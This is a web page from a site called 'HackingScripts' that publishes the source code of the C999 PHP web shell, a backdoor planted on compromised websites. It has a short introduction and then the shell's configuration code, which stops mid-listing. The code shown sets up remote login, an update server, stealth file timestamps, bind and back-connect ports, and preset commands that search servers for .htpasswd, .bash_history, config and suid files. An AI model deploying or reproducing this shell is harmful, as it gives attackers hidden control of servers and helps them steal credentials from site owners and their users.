<!DOCTYPE html>
<html>
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/stylesheet.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/pygment_trac.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/print.css" media="print" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/styles.css" media="print" />
    <link rel="icon" type="image/x-icon" href="/HackingScripts/favicon.ico">


    <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <title> C999 shell </title>
  </head>

  <body>
    <header>
      <div class="inner">
        <h1> <a href="/HackingScripts/">HackingScripts</a> </h1>
        <h2>Hack Scripts for everybody</h2>
      </div>
    </header>

    <div id="content-wrapper">
      <div class="inner clearfix">
        <section id="main-content">

          <h2>C999 shell</h2>
<p class="meta">24 Jan 2014</p>

<p>This was the very first hack script uploaded to my website, so it holds a special place in my heart.</p>

<p>It&#8217;s a version of the <a href="http://hackingscripts.com/c99-shell/" title="C99 Shell">c99 shell script</a>, which is used by hackers (read: script kiddies) to gain backdoor entry into insecure websites.</p>

<p>It appears to be incomplete (I added the final &#8216;?&gt;&#8217;), perhaps because the end of the script was cut off during the upload process. Note that this script is only just over 1100 lines long, while the <a href="http://hackingscripts.com/c99-shell/" title="C99 Shell">complete C99 shell</a> is about 2000 lines longer!</p>

<p>I have received many more C99 scripts since this one, most of them complete and more up-to-date than this one.</p>

<h3>C999 Shell Script Source Code</h3>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="c1">//Starting calls if (!function_exists(&quot;getmicrotime&quot;)) {function getmicrotime() { list($usec, $sec) = explode(&quot; &quot;, microtime());  return ((float)$usec + (float)$sec);}} error_reporting(5); @ignore_user_abort(TRUE); @set_magic_quotes_runtime(0); $win = strtolower(substr(PHP_OS,0,3)) == &quot;win&quot;; define(&quot;starttime&quot;,getmicrotime()); if (get_magic_quotes_gpc()) {if (!function_exists(&quot;strips&quot;)) { function strips(&amp;$arr,$k=&quot;&quot;) {if (is_array($arr))  {foreach($arr as $k=--&amp;gt;$v) {if (strtoupper($k) != &quot;GLOBALS&quot;) {strips($arr[&quot;$k&quot;]);}}}</span>
<span class="k">else</span> <span class="p">{</span><span class="nv">$arr</span> <span class="o">=</span> <span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$arr</span><span class="p">);}}}</span> <span class="nx">strips</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">);}</span>
<span class="nv">$_REQUEST</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">);</span>
<span class="k">foreach</span><span class="p">(</span><span class="nv">$_REQUEST</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$$k</span><span class="p">))</span> <span class="p">{</span><span class="nv">$$k</span> <span class="o">=</span> <span class="nv">$v</span><span class="p">;}}</span>
<span class="nv">$shver</span> <span class="o">=</span> <span class="s2">&quot;1.0 pre-release build #16&quot;</span><span class="p">;</span> <span class="c1">//Current version</span>
<span class="c1">//CONFIGURATION AND SETTINGS</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$unset_surl</span><span class="p">))</span> <span class="p">{</span><span class="nb">setcookie</span><span class="p">(</span><span class="s2">&quot;c999sh_surl&quot;</span><span class="p">);</span> <span class="nv">$surl</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;}</span>
<span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$set_surl</span><span class="p">))</span> <span class="p">{</span><span class="nv">$surl</span> <span class="o">=</span> <span class="nv">$set_surl</span><span class="p">;</span> <span class="nb">setcookie</span><span class="p">(</span><span class="s2">&quot;c999sh_surl&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="p">);}</span>
<span class="k">else</span> <span class="p">{</span><span class="nv">$surl</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;c999sh_surl&quot;</span><span class="p">];</span> <span class="c1">//Set this cookie for manual SURL</span>
<span class="p">}</span>
<span class="nv">$surl_autofill_include</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span> <span class="c1">//If TRUE then search variables with</span>
                               <span class="c1">//descriptors (URLs) and save it in SURL.</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$surl_autofill_include</span> <span class="k">and</span> <span class="o">!</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;c999sh_surl&quot;</span><span class="p">])</span> <span class="p">{</span><span class="nv">$include</span> <span class="o">=</span> <span class="s2">&quot;&amp;&quot;</span><span class="p">;</span> <span class="k">foreach</span>
<span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;&amp;&quot;</span><span class="p">,</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;QUERY_STRING&quot;</span><span class="p">))</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$v</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;=&quot;</span><span class="p">,</span><span class="nv">$v</span><span class="p">);</span>
<span class="nv">$name</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$v</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="nv">$value</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$v</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="k">foreach</span> <span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;http://&quot;</span><span class="p">,</span><span class="s2">&quot;https://&quot;</span><span class="p">,</span><span class="s2">&quot;ssl://&quot;</span><span class="p">,</span><span class="s2">&quot;ftp://&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$needle</span><span class="p">)</span> <span class="p">{</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span><span class="nv">$needle</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
<span class="nv">$includestr</span> <span class="o">.=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;&quot;</span><span class="p">;}}}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;surl_autofill_include&quot;</span><span class="p">])</span> <span class="p">{</span>
<span class="nv">$includestr</span> <span class="o">.=</span> <span class="s2">&quot;surl_autofill_include=1&amp;&quot;</span><span class="p">;}}</span>
<span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$surl</span><span class="p">))</span>
<span class="p">{</span>
 <span class="nv">$surl</span> <span class="o">=</span> <span class="s2">&quot;?&quot;</span><span class="o">.</span><span class="nv">$includestr</span><span class="p">;</span> <span class="c1">//Self url</span>
<span class="p">}</span>
<span class="nv">$surl</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$surl</span><span class="p">);</span>
<span class="nv">$timelimit</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">//time limit of execution this script over server quote</span>
                <span class="c1">//(seconds), 0 = unlimited.</span>
<span class="c1">//Authentication</span>
<span class="nv">$login</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="c1">//login</span>
<span class="c1">//DON&#39;T FORGOT ABOUT PASSWORD!!!</span>
<span class="nv">$pass</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="c1">//password</span>
<span class="nv">$md5_pass</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="c1">//md5-cryped pass. if null, md5($pass)</span>
<span class="nv">$host_allow</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;*&quot;</span><span class="p">);</span> <span class="c1">//array (&quot;{mask}1&quot;,&quot;{mask}2&quot;,...), {mask} = IP or HOST e.g. array(&quot;192.168.0.*&quot;,&quot;127.0.0.1&quot;)</span>
<span class="nv">$login_txt</span> <span class="o">=</span> <span class="s2">&quot;Restricted area&quot;</span><span class="p">;</span> <span class="c1">//http-auth message.</span>
<span class="nv">$accessdeniedmess</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">http</span><span class="o">://</span><span class="nx">ccteam</span><span class="o">.</span><span class="nx">ru</span><span class="o">/</span><span class="nx">releases</span><span class="o">/</span><span class="nx">c999shell\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot;&amp;gt;c999shell v.&quot;</span><span class="o">.</span><span class="nv">$shver</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt;: access denied&quot;</span><span class="p">;</span>
<span class="nv">$gzipencode</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span> <span class="c1">//Encode with gzip?</span>
<span class="nv">$updatenow</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span> <span class="c1">//If TRUE, update now (this variable will be FALSE)</span>
<span class="nv">$c999sh_updateurl</span> <span class="o">=</span> <span class="s2">&quot;http://ccteam.ru/update/c999shell/&quot;</span><span class="p">;</span> <span class="c1">//Update server</span>
<span class="nv">$c999sh_sourcesurl</span> <span class="o">=</span> <span class="s2">&quot;http://ccteam.ru/files/c999sh_sources/&quot;</span><span class="p">;</span> <span class="c1">//Sources-server</span>
<span class="nv">$filestealth</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span> <span class="c1">//if TRUE, don&#39;t change modify- and access-time</span>
<span class="nv">$donated_html</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;/pre&amp;gt;</span>
<span class="s2">&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Owned by hacker&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;</span>
<span class="s2">&amp;lt;pre&amp;gt;&quot;</span><span class="p">;</span>
<span class="cm">/* If you publish free shell and you wish</span>
<span class="cm">add link to your site or any other information,</span>
<span class="cm">put here your html. */</span>
<span class="nv">$donated_act</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">);</span> <span class="c1">//array (&quot;act1&quot;,&quot;act2,&quot;...), if $act is in this array, display $donated_html.</span>
<span class="nv">$curdir</span> <span class="o">=</span> <span class="s2">&quot;./&quot;</span><span class="p">;</span> <span class="c1">//start folder</span>
<span class="c1">//$curdir = getenv(&quot;DOCUMENT_ROOT&quot;);</span>
<span class="nv">$tmpdir</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="c1">//Folder for tempory files. If empty, auto-fill (/tmp or %WINDIR/temp)</span>
<span class="nv">$tmpdir_log</span> <span class="o">=</span> <span class="s2">&quot;./&quot;</span><span class="p">;</span> <span class="c1">//Directory logs of long processes (e.g. brute, scan...)</span>
<span class="nv">$log_email</span> <span class="o">=</span> <span class="s2">&quot;user@host.tld&quot;</span><span class="p">;</span> <span class="c1">//Default e-mail for sending logs</span>
<span class="nv">$sort_default</span> <span class="o">=</span> <span class="s2">&quot;0a&quot;</span><span class="p">;</span> <span class="c1">//Default sorting, 0 - number of colomn, &quot;a&quot;scending or &quot;d&quot;escending</span>
<span class="nv">$sort_save</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span> <span class="c1">//If TRUE then save sorting-position using cookies.</span>
<span class="c1">// Registered file-types.</span>
<span class="c1">//  array(</span>
<span class="c1">//   &quot;{action1}&quot;=&amp;gt;array(&quot;ext1&quot;,&quot;ext2&quot;,&quot;ext3&quot;,...),</span>
<span class="c1">//   &quot;{action2}&quot;=&amp;gt;array(&quot;ext4&quot;,&quot;ext5&quot;,&quot;ext6&quot;,...),</span>
<span class="c1">//   ...</span>
<span class="c1">//  )</span>
<span class="nv">$ftypes</span>  <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
 <span class="s2">&quot;html&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;html&quot;</span><span class="p">,</span><span class="s2">&quot;htm&quot;</span><span class="p">,</span><span class="s2">&quot;shtml&quot;</span><span class="p">),</span>
 <span class="s2">&quot;txt&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;txt&quot;</span><span class="p">,</span><span class="s2">&quot;conf&quot;</span><span class="p">,</span><span class="s2">&quot;bat&quot;</span><span class="p">,</span><span class="s2">&quot;sh&quot;</span><span class="p">,</span><span class="s2">&quot;js&quot;</span><span class="p">,</span><span class="s2">&quot;bak&quot;</span><span class="p">,</span><span class="s2">&quot;doc&quot;</span><span class="p">,</span><span class="s2">&quot;log&quot;</span><span class="p">,</span><span class="s2">&quot;sfc&quot;</span><span class="p">,</span><span class="s2">&quot;cfg&quot;</span><span class="p">,</span><span class="s2">&quot;htaccess&quot;</span><span class="p">),</span>
 <span class="s2">&quot;exe&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;sh&quot;</span><span class="p">,</span><span class="s2">&quot;install&quot;</span><span class="p">,</span><span class="s2">&quot;bat&quot;</span><span class="p">,</span><span class="s2">&quot;cmd&quot;</span><span class="p">),</span>
 <span class="s2">&quot;ini&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;ini&quot;</span><span class="p">,</span><span class="s2">&quot;inf&quot;</span><span class="p">),</span>
 <span class="s2">&quot;code&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;php&quot;</span><span class="p">,</span><span class="s2">&quot;phtml&quot;</span><span class="p">,</span><span class="s2">&quot;php3&quot;</span><span class="p">,</span><span class="s2">&quot;php4&quot;</span><span class="p">,</span><span class="s2">&quot;inc&quot;</span><span class="p">,</span><span class="s2">&quot;tcl&quot;</span><span class="p">,</span><span class="s2">&quot;h&quot;</span><span class="p">,</span><span class="s2">&quot;c&quot;</span><span class="p">,</span><span class="s2">&quot;cpp&quot;</span><span class="p">,</span><span class="s2">&quot;py&quot;</span><span class="p">,</span><span class="s2">&quot;cgi&quot;</span><span class="p">,</span><span class="s2">&quot;pl&quot;</span><span class="p">),</span>
 <span class="s2">&quot;img&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;gif&quot;</span><span class="p">,</span><span class="s2">&quot;png&quot;</span><span class="p">,</span><span class="s2">&quot;jpeg&quot;</span><span class="p">,</span><span class="s2">&quot;jfif&quot;</span><span class="p">,</span><span class="s2">&quot;jpg&quot;</span><span class="p">,</span><span class="s2">&quot;jpe&quot;</span><span class="p">,</span><span class="s2">&quot;bmp&quot;</span><span class="p">,</span><span class="s2">&quot;ico&quot;</span><span class="p">,</span><span class="s2">&quot;tif&quot;</span><span class="p">,</span><span class="s2">&quot;tiff&quot;</span><span class="p">,</span><span class="s2">&quot;avi&quot;</span><span class="p">,</span><span class="s2">&quot;mpg&quot;</span><span class="p">,</span><span class="s2">&quot;mpeg&quot;</span><span class="p">),</span>
 <span class="s2">&quot;sdb&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;sdb&quot;</span><span class="p">),</span>
 <span class="s2">&quot;phpsess&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;sess&quot;</span><span class="p">),</span>
 <span class="s2">&quot;download&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;exe&quot;</span><span class="p">,</span><span class="s2">&quot;com&quot;</span><span class="p">,</span><span class="s2">&quot;pif&quot;</span><span class="p">,</span><span class="s2">&quot;src&quot;</span><span class="p">,</span><span class="s2">&quot;lnk&quot;</span><span class="p">,</span><span class="s2">&quot;zip&quot;</span><span class="p">,</span><span class="s2">&quot;rar&quot;</span><span class="p">,</span><span class="s2">&quot;gz&quot;</span><span class="p">,</span><span class="s2">&quot;tar&quot;</span><span class="p">)</span>
<span class="p">);</span>
<span class="c1">// Registered executable file-types.</span>
<span class="c1">//  array(</span>
<span class="c1">//   string &quot;command{i}&quot;=&amp;gt;array(&quot;ext1&quot;,&quot;ext2&quot;,&quot;ext3&quot;,...),</span>
<span class="c1">//   ...</span>
<span class="c1">//  )</span>
<span class="c1">//   {command}: %f% = filename</span>
<span class="nv">$exeftypes</span>  <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
 <span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;PHPRC&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; -q %f%&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;php&quot;</span><span class="p">,</span><span class="s2">&quot;php3&quot;</span><span class="p">,</span><span class="s2">&quot;php4&quot;</span><span class="p">),</span>
 <span class="s2">&quot;perl %f%&quot;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;pl&quot;</span><span class="p">,</span><span class="s2">&quot;cgi&quot;</span><span class="p">)</span>
<span class="p">);</span>
<span class="cm">/* Highlighted files.</span>
<span class="cm">  array(</span>
<span class="cm">   i=&amp;gt;array({regexp},{type},{opentag},{closetag},{break})</span>
<span class="cm">   ...</span>
<span class="cm">  )</span>
<span class="cm">  string {regexp} - regular exp.</span>
<span class="cm">  int {type}:</span>
<span class="cm">0 - files and folders (as default),</span>
<span class="cm">1 - files only, 2 - folders only</span>
<span class="cm">  string {opentag} - open html-tag, e.g. &quot;&amp;lt;b&amp;gt;&quot; (default)</span>
<span class="cm">  string {closetag} - close html-tag, e.g. &quot;&amp;lt;/b&amp;gt;&quot; (default)</span>
<span class="cm">  bool {break} - if TRUE and found match then break</span>
<span class="cm">*/</span>
<span class="nv">$regxp_highlight</span>  <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
  <span class="k">array</span><span class="p">(</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;PHP_SELF&quot;</span><span class="p">]),</span><span class="mi">1</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/pre&amp;gt;</span>
<span class="s2">&amp;lt;span&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot;&amp;lt;/span&amp;gt;</span>
<span class="s2">&amp;lt;pre&amp;gt;&quot;</span><span class="p">),</span> <span class="c1">// example</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;config.php&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="c1">// example</span>
<span class="p">);</span>
<span class="nv">$safemode_diskettes</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;a&quot;</span><span class="p">);</span> <span class="c1">// This variable for disabling diskett-errors.</span>
 <span class="c1">// array (i=&amp;gt;{letter} ...); string {letter} - letter of a drive</span>
<span class="c1">//$safemode_diskettes = range(&quot;a&quot;,&quot;z&quot;);</span>
<span class="nv">$hexdump_lines</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span><span class="c1">// lines in hex preview file</span>
<span class="nv">$hexdump_rows</span> <span class="o">=</span> <span class="mi">24</span><span class="p">;</span><span class="c1">// 16, 24 or 32 bytes in one line</span>
<span class="nv">$nixpwdperpage</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span> <span class="c1">// Get first N lines from /etc/passwd</span>
<span class="nv">$bindport_pass</span> <span class="o">=</span> <span class="s2">&quot;c999&quot;</span><span class="p">;</span>  <span class="c1">// default password for binding</span>
<span class="nv">$bindport_port</span> <span class="o">=</span> <span class="s2">&quot;31373&quot;</span><span class="p">;</span> <span class="c1">// default port for binding</span>
<span class="nv">$bc_port</span> <span class="o">=</span> <span class="s2">&quot;31373&quot;</span><span class="p">;</span> <span class="c1">// default port for back-connect</span>
<span class="nv">$datapipe_localport</span> <span class="o">=</span> <span class="s2">&quot;8081&quot;</span><span class="p">;</span> <span class="c1">// default port for datapipe</span>
<span class="c1">// Command-aliases</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$win</span><span class="p">)</span>
<span class="p">{</span>
 <span class="nv">$cmdaliases</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;-----------------------------------------------------------&quot;</span><span class="p">,</span> <span class="s2">&quot;ls -la&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find all suid files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -perm -04000 -ls&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find suid files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -perm -04000 -ls&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find all sgid files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -perm -02000 -ls&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find sgid files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -perm -02000 -ls&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find config.inc.php files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name config.inc.php&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find config* files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name </span><span class="se">\&quot;</span><span class="s2">config*</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find config* files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name </span><span class="se">\&quot;</span><span class="s2">config*</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find all writable folders and files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -perm -2 -ls&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find all writable folders and files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -perm -2 -ls&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find all service.pwd files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name service.pwd&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find service.pwd files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name service.pwd&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find all .htpasswd files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name .htpasswd&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find .htpasswd files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name .htpasswd&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find all .bash_history files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name .bash_history&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find .bash_history files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name .bash_history&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find all .fetchmailrc files&quot;</span><span class="p">,</span> <span class="s2">&quot;find / -type f -name .fetchmailrc&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;find .fetchmailrc files in current dir&quot;</span><span class="p">,</span> <span class="s2">&quot;find . -type f -name .fetchmailrc&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;list file attributes on a Linux second extended file system&quot;</span><span class="p">,</span> <span class="s2">&quot;lsattr -va&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;show opened ports&quot;</span><span class="p">,</span> <span class="s2">&quot;netstat -an | grep -i listen&quot;</span><span class="p">)</span>
 <span class="p">);</span>
<span class="p">}</span>
<span class="k">else</span>
<span class="p">{</span>
 <span class="nv">$cmdaliases</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;-----------------------------------------------------------&quot;</span><span class="p">,</span> <span class="s2">&quot;dir&quot;</span><span class="p">),</span>
  <span class="k">array</span><span class="p">(</span><span class="s2">&quot;show opened ports&quot;</span><span class="p">,</span> <span class="s2">&quot;netstat -an&quot;</span><span class="p">)</span>
 <span class="p">);</span>
<span class="p">}</span>
<span class="nv">$sess_cookie</span> <span class="o">=</span> <span class="s2">&quot;c999shvars&quot;</span><span class="p">;</span> <span class="c1">// Cookie-variable name</span>
<span class="nv">$usefsbuff</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span> <span class="c1">//Buffer-function</span>
<span class="nv">$copy_unset</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span> <span class="c1">//Remove copied files from buffer after pasting</span>
<span class="c1">//Quick launch</span>
<span class="nv">$quicklaunch</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;img alt=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">Home\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; src=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">act</span><span class="o">=</span><span class="nx">img</span><span class="o">&amp;</span><span class="nx">img</span><span class="o">=</span><span class="nx">home\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; width=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">20</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; height=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">20</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; border=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">0</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; /&amp;gt;&quot;</span><span class="p">,</span><span class="nv">$surl</span><span class="p">),</span>
 <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;img alt=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">Back\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; src=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">act</span><span class="o">=</span><span class="nx">img</span><span class="o">&amp;</span><span class="nx">img</span><span class="o">=</span><span class="nx">back\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; width=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">20</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; height=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">20</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; border=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">0</span><span 